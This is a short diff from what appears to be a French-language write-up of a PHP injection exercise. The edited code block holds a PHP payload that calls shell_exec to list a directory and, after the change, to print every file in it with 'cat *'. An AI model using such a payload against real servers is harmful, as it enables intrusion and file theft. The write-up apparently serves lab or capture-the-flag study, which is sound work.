@@ -15,7 +15,7 @@ Maintenant faisons notre injection php
 ```PHP
 <?php
 echo shell_exec("ls");
-echo shell_exec("cat");
+echo shell_exec("cat *");
 ?>
 ```
 
